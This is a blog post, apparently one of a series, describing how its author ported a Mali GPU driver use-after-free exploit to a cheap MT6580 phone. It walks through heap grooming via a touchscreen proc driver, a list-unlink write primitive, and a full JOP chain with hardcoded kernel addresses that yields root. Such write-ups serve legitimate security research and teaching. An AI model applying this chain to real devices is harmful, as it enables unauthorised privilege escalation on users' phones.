---
published: true
title: "🗺️ [4] Should be an Easy Port, Right?"
toc: true
toc_sticky: true
tagline: "I bought another MT6580-based device, the Soyes XS11, thinking it would be a nice easy port of the translator exploit... it wasn't, but at least I got there in the end!"
windowGradientStart: rgb(0, 11, 130)
windowGradientEnd: rgb(8, 0, 165)
windowBorder: rgb(0, 0, 0)
minimizeButton: rgb(47, 255, 0)
maximizeButton: rgb(255, 162, 0)
closeButton: rgb(255, 0, 0)
tags:
  - Linux Kernel Driver
  - Binary Exploitation
  - Android LPE
---

The Soyes XS11 is the cheapest phone I could find on Aliexpress with an MT6580 chipset, but they are everywhere in clone-phones as its a super cheap processor. Lets exploit the bug again!

![xs11.png](/assets/images/translator/p5/xs11.png)

It is also comically small, here it is next to a Samsung Galaxy S22:

![small_af.jpg](/assets/images/translator/p5/small_af.jpg)

# Great Start

I used *mtkclient* to pull the kernel off of the phone, and loaded it into Ghidra. The first thing I tried was just blindly throwing the exploit at it.

There were a couple of snags at the start that weren't that difficult to work around:
- Size of the **mali_mem_alloc** structure was different, removing 4 bytes fixed that problem
- Weird difference in **ioctl** codes? I ended up just copying the ones from the **ioctl** handler in the kernel which fixed this

Once these were worked around, I threw the exploit at the device, and the uglier problems started appearing.

## Problem 1

The first problem I came across was that the specific **ion** heap we targeted in the translator exploit is not on this device, the following heaps are available:

```
shell@f202_f22_p10:/ $ ls /sys/kernel/debug/ion/heaps/
ion_fb_heap
ion_fb_heap_total_in_pool
ion_mm_heap
ion_mm_heap_shrink
ion_mm_heap_total_in_pool
```

And on the translator we had these:

```
127|aeon6580_we_n:/ $ ls /sys/kernel/debug/ion/heaps/
ion_fb_heap                   ion_mm_heap_for_camera_total_in_pool 
ion_fb_heap_total_in_pool     ion_mm_heap_shrink                   
ion_mm_heap                   ion_mm_heap_total_in_pool            
ion_mm_heap_for_camera        ion_system_contig_heap               
ion_mm_heap_for_camera_shrink ion_system_contig_heap_total_in_pool
```

And we used **ion_system_contig_heap** in our exploit. It isn't hard to work around this as we can just use the **ion_mm_heap** as this also uses an **sg_table**, but then an even worse problem came about!

## Problem 2

The kernel kept crashing with a null pointer dereference in **ion_mmap** (it tries to dereference **r3** which contains zero), here are the surrounding instructions and code:

![crash_instructions.png](/assets/images/translator/p5/crash_instructions.png)

![crash_code.png](/assets/images/translator/p5/crash_code.png)

And the source code:

```c
static int ion_mmap(struct dma_buf *dmabuf, struct vm_area_struct *vma)
{
	struct ion_buffer *buffer = dmabuf->priv;
	int ret = 0;

	if (!buffer->heap->ops->map_user) {
		pr_err("%s: this heap does not define a method for mapping to userspace\n",
			__func__);
		return -EINVAL;
	}
  ...
```

So the **heap** object pointer is *0x14* bytes into the **ion_buffer** object, and this is somehow getting set to *NULL*? At this point I assume its the **ion_buffer** that has landed in the freed **mali_alloc** space.

The only thing that actually touches that memory on the **mali** side is **mali_mem_vma_close**, so lets have a peek at that:

![vma_close.png](/assets/images/translator/p5/vma_close.png)

And lets compare it to the equivalent code on the translator:

![vma_close_translator.png](/assets/images/translator/p5/vma_close_translator.png)

![sus.png](/assets/images/translator/p5/sus.png)

I did some digging and found some [source code](https://github.com/elephone-dev/P9000-Kernel/blob/3d9668876fc728933e4497d336186381d8b7a892/drivers/gpu/arm/mali/linux/mali_memory.c) that seems closer to what we are seeing in this kernel:

```c
static void mali_mem_vma_close(struct vm_area_struct *vma)
{
	/* If need to share the allocation, unref ref_count here */
	mali_mem_allocation *alloc = (mali_mem_allocation *)vma->vm_private_data;
	alloc->cpu_mapping.addr = 0;
	alloc->cpu_mapping.vma = NULL;
	mali_allocation_unref(&alloc);
	vma->vm_private_data = NULL;
}
```

So, the bad news is that we can't use the *minnka* exploit technique because we obliterate important pointers in the **ion_buffer** every time we call **munmap** to decrement the pointer, but the good news is that the bug is there despite the differences in the code. 

![good_bad_news.png](/assets/images/translator/p5/good_bad_news.png)

# New Exploit

Luckily, there is another way we can exploit this bug. I avoided it on the translator because it kept giving me strange crashes, so I shelved it and used the **ion** method.

Essentially, we have to turn this into a sort-of double free, where we cause **_mali_free_allocation_mem** to be called on a **mali_alloc** object after **mmap**ing it and using **MALI_IOC_MEM_FREE** to decrement the refcount to *1*. Then reoccupy the object with a fake **mali_alloc** with a **refcount** of *1*, and then use the **munmap** to call **_mali_free_allocation_mem** on it again.

## Problem 3

The main problem with causing a double free is that the freelist get corrupted, and it will keep giving the same memory to allocations in that cache. 

On the translator, I was using **sendmsg** to spray controlled data, but it was being freed pretty much immediately, so when the second **_mali_free_allocation_mem** occured, the freelist was getting corrupted and all sorts of funky crashes occured.

So using **sendmsg** as a spray isn't really an option anymore, and ideally we want an allocation with controlled data which the caller will keep alive for a while. The plan would basically be the following:
- Cause the first free on the **mali_alloc** region
- Occupy the free space with controlled data, must not be freed straight away
- Cause the second free on the **mali_alloc** region which now contains the controlled data
- At this point, cause some other allocation to get the kernel to give you the freed **mali_alloc** region again, needs to be 'permanent' - we can use another **mali_alloc** object for this
- Now we are free to let the 'controlled data' allocation get freed, and we will be left with a dangling **mali_alloc** pointer, which is fine, as long as we don't interact with it

### gsl_config

There is a driver on this phone that wasn't in the translator called **gsl_config**, it is related to the touch screen. I won't go into too much detail here, but its **write** method is super useful for the above plan:

```c
static ssize_t gsl_config_write_proc(struct file *file, const char *buffer,
				 size_t count, loff_t *data)
{
	u8 buf[8] = {0};
	char temp_buf[CONFIG_LEN] = {0};
	char *path_buf;
	int tmp = 0;
	int tmp1 = 0;

	if (count > 512) {
		print_info("size not match [%d:%zd]\n", CONFIG_LEN, count);
		return -EFAULT;
	}
	path_buf = kzalloc(count, GFP_KERNEL); // ALLOCATION OF ARBITRARY SIZE
	if (!path_buf) {
		print_info("alloc path_buf memory error\n");
		return -EFAULT;
	}
	if (copy_from_user(path_buf, buffer, count)) { // COMPLETELY CONTROLLED MEMORY
		print_info("copy from user fail\n");
		goto exit_write_proc_out;
	}
	memcpy(temp_buf, path_buf, (count < CONFIG_LEN ? count : CONFIG_LEN));
	buf[3] = char_to_int(temp_buf[14]) << 4 | char_to_int(temp_buf[15]);
	buf[2] = char_to_int(temp_buf[16]) << 4 | char_to_int(temp_buf[17]);
	buf[1] = char_to_int(temp_buf[18]) << 4 | char_to_int(temp_buf[19]);
	buf[0] = char_to_int(temp_buf[20]) << 4 | char_to_int(temp_buf[21]);
	buf[7] = char_to_int(temp_buf[5]) << 4 | char_to_int(temp_buf[6]);
	buf[6] = char_to_int(temp_buf[7]) << 4 | char_to_int(temp_buf[8]);
	buf[5] = char_to_int(temp_buf[9]) << 4 | char_to_int(temp_buf[10]);
	buf[4] = char_to_int(temp_buf[11]) << 4 | char_to_int(temp_buf[12]);
	if ('v' == temp_buf[0] && 's' == temp_buf[1]) {
		memcpy(gsl_read, temp_buf, 4);
		print_info("gsl version\n");
	} else if ('s' == temp_buf[0] && 't' == temp_buf[1]) {
		gsl_proc_flag = 1;
		reset_chip(gsl_client);
	} else if ('e' == temp_buf[0] && 'n' == temp_buf[1]) {
		msleep(20); // WE CAN TRIGGER THIS SLEEP TO TEMPORARILY STOP THE FREE
		reset_chip(gsl_client);
		startup_chip(gsl_client);
		gsl_proc_flag = 0;
	} else if ('r' == temp_buf[0] && 'e' == temp_buf[1]) {
		memcpy(gsl_read, temp_buf, 4);
		memcpy(gsl_data_proc, buf, 8);
	} else if ('w' == temp_buf[0] && 'r' == temp_buf[1]) {
		gsl_ts_write(gsl_client, buf[4], buf, 4);
	}
exit_write_proc_out:
	kfree(path_buf);
	return count;
}
```

To summarise what the above shows, we can use a **write** call to the **/proc/gsl_config** to create an allocation of an arbitrary size (we'll target **kmalloc-128**) with completely controlled data, and we can make the driver sleep for 20 milliseconds to hold the allocation. This is perfect!

So combining this with the plan, we get this diagram:

![no_double_free.png](/assets/images/translator/p5/no_double_free.png)

And this solves the double free issue!

## Strange Write Primitive

So we can cause the double free without crashing the device, what primitives do we get?

We end up calling **mali_mem_allocation_struct_destory** with a controlled **mali_alloc** structure, referring back to the source code:

```c
void  mali_mem_allocation_struct_destory(mali_mem_allocation *alloc)
{
	MALI_DEBUG_ASSERT_POINTER(alloc);
	MALI_DEBUG_ASSERT_POINTER(alloc->session);
	mutex_lock(&alloc->session->allocation_mgr.list_mutex);
	list_del(&alloc->list);
	alloc->session->allocation_mgr.mali_allocation_num--;
	mutex_unlock(&alloc->session->allocation_mgr.list_mutex);

	kfree(alloc);
}
```

And if we take a look at the **list_del** part of the code in the devices kernel:

![write_primitive.png](/assets/images/translator/p5/write_primitive.png)

Or if we look at the assembly:

```
c0419d94 40 00 94 e5     ldr      r0,[r4,#0x40]
c0419d98 44 10 94 e5     ldr      r1,[r4,#0x44]
```

We control **r0** and **r1**, and the write occurs here:

```
c0419dac 04 10 80 e5     str      r1,[r0,#0x4]
c0419db0 00 00 81 e5     str      r0,[r1,#0x0]
```

We get a *write-what-where*, but also a *write-where-what*...

So, a bit of a weird write primitive (they both need to be writeable pointers), but a write primitive nonetheless!

![thumbs_up.gif](/assets/images/translator/p5/thumbs_up.gif)

### What to Write?

Looking at this in hindsight, I have no idea how this worked? Here are the values I overwrote it with:

```c
// overwrite list pointers
g_spray_buff[0x40 / 4] = 0xc099762c - 0x4; // where to write it (wmt_dbg function pointer - 0x4)
g_spray_buff[0x44 / 4] = 0xc07d8c08 - 0x4; // what to write (address of first gadget - 0x4)
```

Basically, the plan was to attack the **wmt_dbg_hwver_get** handler (refer to the last blog if its your first time hearing abour **wmt_dbg**), and set that to be the address we want to execute. The address of the handler is **0xc099762c** and the address of the first gadget we execute is **0xc07d8c08**. I remember having to decrement the gadget address by four otherwise the first instruction wasn't executing. 

The reason for this was actually because the kernel code is writeable, and I was clobbering the instruction I wanted to execute with the address that gets written in the second gadget! My quick fix was to decrement the address of the gadget by **0x4**, which would clobber the instruction before the gadget and also make the code execute this, but clearly this is a valid instruction as nothing crashes:

![phew.png](/assets/images/translator/p5/phew.png)

Cool, so we can write the address of some executable gadget, and use **wmt_dbg** to trigger execution of said gadget.

## JOP-Chain

Why am I using JOP? Can't I just do what I did with the translator and jump to userspace? Unfortunately not, as I'd get an error any time I tried to execute/write to userspace:

```
[ 1236.177155]  (0)[2853:frels]Unable to handle kernel paging request at virtual address b6f238b4
```

So it seems like there is some sort of PXN going on here, therefore we will have to use what the kernel can give us, so its time to write my first JOP-chain! It'll just need to call **commit_creds(prepare_kernel_cred(NULL))** like in the translator exploit.

### What is JOP?

JOP is basically ROP, but instead of using a fake 'stack' as such, you use a dispatcher table which is a list of gadget addresses. You then use JOP-gadgets to walk along the dispatcher table and execute gadgets as you go. In ARM, branches can be used to achieve JOP, specifically **blx**. This [paper](https://www.comp.nus.edu.sg/~liangzk/papers/asiaccs11.pdf) explains it pretty well if you replace jump with branch in your mind.

![jop_vs_rop.png](/assets/images/translator/p5/jop_vs_rop.png)

### Controlling Some Registers

To start off with, we need control of as many registers as possible. If you think back to the last blog, **wmt_dbg** lets you give arguments to the functions you call, and as we are attacking one of these handlers, it gives us total control of **r1**, **r2** which is super useful. 

![xyz.png](/assets/images/translator/p5/xyz.png)

### Dispatcher Table

Now we have control of a couple of registers, we will need a dispatcher table, which will basically contain gadget addresses. In this case, I used a static buffer in the **gsl_config** driver to build up a dispatcher table. We have basically arbitrary control of this memory region, so we now have everything to throw together a JOP-chain.

### Finally, JOP-Chain

We set **r1** to the address of the dispatcher table, and **r2** to the first JOP-gadget to kick things off. Then each gadget is responsible for loading the next gadget address from the dispatcher table and jumping to it (as well as doing something useful). As an example, lets go through an example gadget:

```
c05b7b90 50 30 94 e5     ldr        r3,[r4,#0x50]
c05b7b94 33 ff 2f e1     blx        r3
c05b7b98 5c 30 94 e5     ldr        r3,[r4,#0x5c]
c05b7b9c b4 00 d5 e1     ldrh       r0,[r5,#0x4]
c05b7ba0 33 ff 2f e1     blx        r3
```

The address of the dispatcher table is in **r4**, so the gadget loads the address of a function it wants to execute from the disptacher table into **r3**, executes it, then returns and loads the address of the next gadget from the dispatcher table (still in **r4**) into **r3** and branches to it, letting the chain continue while having done something useful. This gadget lets you execute functions.

This approach is slightly different to the approach in the paper, as every gadget is basically its own dispatcher gadget, but it leans heavily on the dispatcher table so its still JOP.

Here is the full chain I used to pop a root shell in the kernel:

```
// use this to kick off the chain
// [G1] c07d8c08 01 40 a0 e1     cpy        r4,r1                // we control r1 in this, so we get control of r4
// [G1] c07d8c0c 32 ff 2f e1     blx        r2                   // we also control r2 here so maintain execution

// for prepare_kernel_cred call

// [G2] c0082998 14 30 94 e5     ldr        r3,[r4,#0x14]        // r4 offset 0x14 will contain a self referencing pointer
// [G2] c008299c 38 30 93 e5     ldr        r3,[r3,#0x38]        // next gadget address loaded from r3 offset 0x38
// [G2] c00829a0 00 00 53 e3     cmp        r3,#0x0              // ignore
// [G2] c00829a4 f6 ff ff 0a     beq        LAB_c0082984         // ignore
// [G2] c00829a8 04 00 a0 e1     cpy        r0,r4                // gets the address of controlled buffer into r0
// [G2] c00829ac 33 ff 2f e1     blx        r3                   // branch to loaded gadget

// [G3] c07db8f4 38 30 94 e5     ldr        r3,[r4,#0x38]        // r4 offset 0x38 will contain the address of next gadget to execute
// [G3] c07db8f8 00 00 53 e3     cmp        r3,#0x0              // ignore
// [G3] c07db8fc 04 00 00 0a     beq        LAB_c07db914         // ignore
// [G3] c07db900 44 60 94 e5     ldr        r6,[r4,#0x44]        // load address into r6 used in next gadget
// [G3] c07db904 33 ff 2f e1     blx        r3                   // branch to loaded gadget

// [G4] c0185d70 0c 30 96 e5     ldr        r3,[r6,#0xc]         // we control r6, so load next gadget from that offset 0xc
// [G4] c0185d74 00 50 a0 e1     cpy        r5,r0                // get address of controlled buffer into r5
// [G4] c0185d78 08 00 a0 e1     cpy        r0,r8                // ignore, r0 clobbered now
// [G4] c0185d7c 33 ff 2f e1     blx        r3                   // branch to loaded gadget

// [G5] c02d8e24 48 30 95 e5     ldr        r3,[r5,#0x48]        // load address of next gadget from controlled buffer
// [G5] c02d8e28 04 a0 a0 e1     cpy        r10,r4               // copy address of controlled buffer into r10, needed later
// [G5] c02d8e2c 30 10 1b e5     ldr        r1,[r11,#local_34]   // ignore, hopefully r11 is fine
// [G5] c02d8e30 33 ff 2f e1     blx        r3                   // branch to loaded gadget

// [G6] c03052c4 40 30 96 e5     ldr        r3,[r6,#0x40]        // load address of next gadget from controlled buffer
// [G6] c03052c8 06 10 a0 e1     cpy        r1,r6                // ignore
// [G6] c03052cc 00 00 a0 e3     mov        r0,#0x0              // clear r0 got prepare_kernel_cred
// [G6] c03052d0 33 ff 2f e1     blx        r3                   // branch to loaded gadget

// [G7] c03f2c08 18 30 9a e5     ldr        r3,[r10,#0x18]       // load address of prepare_kernel_cred from controlled buffer
// [G7] c03f2c0c 00 00 53 e3     cmp        r3,#0x0              // ignore
// [G7] c03f2c10 00 00 00 0a     beq        LAB_c03f2c18         // ignore
// [G7] c03f2c14 33 ff 2f e1     blx        r3                   // call prepare_kernel_cred
// [G7] c03f2c18 0c 30 9a e5     ldr        r3,[r10,#0xc]        // load address of next gadget from controlled buffer
// [G7] c03f2c1c 01 90 a0 e3     mov        r9,#0x1              // ignore
// [G7] c03f2c20 33 ff 2f e1     blx        r3                   // branch to loaded gadget

// now prepared kernel cred is in r0, need to pass that into commit_creds as r0

// [G8] c05b7b90 50 30 94 e5     ldr        r3,[r4,#0x50]        // load address of commit_creds from controlled buffer
// [G8] c05b7b94 33 ff 2f e1     blx        r3                   // call commit_creds
// [G8] c05b7b98 5c 30 94 e5     ldr        r3,[r4,#0x5c]        // load address to hand back execution to
// [G8] c05b7b9c b4 00 d5 e1     ldrh       r0,[r5,#0x4]         // ignore
// [G8] c05b7ba0 33 ff 2f e1     blx        r3                   // return

// now we have called commit_creds(prepare_kernel_cred(NULL)), can just return from the 'function'
```

And here is the code I used to write the dispatcher table into memory:

```c
// [G2]
write_gsl_config(gsl_fd, 0xc0d1f030 - 0x38, base_offset + 0x14 / 4);    // [G2] - ldr r3,[r4,#0x14], first entry will be r3 loaded in G2
write_gsl_config(gsl_fd, 0xc07db8f4, base_offset);                      // [G2] - r3 to load and branch to at the end of G2

// [G3]
write_gsl_config(gsl_fd, 0xc0185d70, base_offset + 0x38 / 4);           // [G3] - r3 to load and branch to at the end of G3
write_gsl_config(gsl_fd, 0xc0d1f030 + 0x14, base_offset + 0x44 / 4);    // [G3] - r6 to use in G4 to load next gadget

// [G4]
write_gsl_config(gsl_fd, 0xc02d8e24, base_offset + 0x20 / 4);           // [G4] - r3 to load and branch to at the end of G4

// [G5]
write_gsl_config(gsl_fd, 0xc03052c4, base_offset + 0x48 / 4);           // [G5] - r3 to load and branch to at the end of G5

// [G6]
write_gsl_config(gsl_fd, 0xc03f2c08, base_offset + 0x54 / 4);           // [G6] - r3 to load and branch to at the end of G6 (+ 0x14 from earlier r6 load adjustment)

// [G7]
write_gsl_config(gsl_fd, 0xc05b7b90, base_offset + 0xc / 4);            // [G7] - r3 to load and branch to at the end of G7
write_gsl_config(gsl_fd, PREPARE_KERNEL_CRED_ADDR, base_offset + 0x18 / 4); // [G7] - address of prepare kernel cred function to call

// [G8]
write_gsl_config(gsl_fd, COMMIT_CREDS_ADDR, base_offset + 0x50 / 4);    // [G8] - address of commit_creds function to call
write_gsl_config(gsl_fd, 0xc04c5770, base_offset + 0x5C / 4);           // [G8] - address to hand back execution
```

## We're Root Again!

After all of that, all thats left to do is use **wmt_dbg** to call the patched handler with the correct **r1** and **r2** values, and we can pop a root shell again!

![frels.gif](/assets/images/translator/p5/frels.gif)

# Conclusion

Well, that was a lot more long-winded than I originally anticipated. However, I learned a bunch of new stuff, and wrote my first JOP-chain - so worth it in the end! That marks the end of my investigation into Mali Utgard, I'll leave it to rest in peace now...

![rip.jpg](/assets/images/translator/p5/rip.jpg)